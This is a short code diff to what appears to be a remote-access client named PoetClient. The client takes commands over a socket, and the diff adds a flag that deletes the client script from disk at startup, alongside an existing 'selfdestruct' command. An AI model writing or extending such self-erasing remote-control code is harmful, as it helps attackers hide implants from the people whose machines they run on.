@@ -123,7 +123,8 @@ class PoetClient(object):
                         s.send(e.strerror)
                 elif inp == 'selfdestruct':
                     try:
-                        os.remove(__file__)
+                        if not args.delete:
+                            os.remove(__file__)
                         if __file__.strip('./') not in os.listdir('.'):
                             s.send('boom')
                             sys.exit()
@@ -199,6 +200,7 @@ def get_args():
     parser.add_argument('delay', metavar='DELAY', type=int, help='(s)')
     parser.add_argument('-p', '--port')
     parser.add_argument('-v', '--verbose', action="store_true")
+    parser.add_argument('-d', '--delete', action="store_true")
     return parser.parse_args()
 
 
@@ -215,12 +217,17 @@ def is_active(host, port):
 
 
 def main():
+    global args
     args = get_args()
 
     if args.verbose:
         log.basicConfig(format='%(message)s', level=log.INFO)
     else:
         log.basicConfig(format='%(message)s')
+
+    if args.delete:
+        log.info('[+] Deleting client.')
+        os.remove(__file__)
 
     DELAY = args.delay
     HOST = args.host
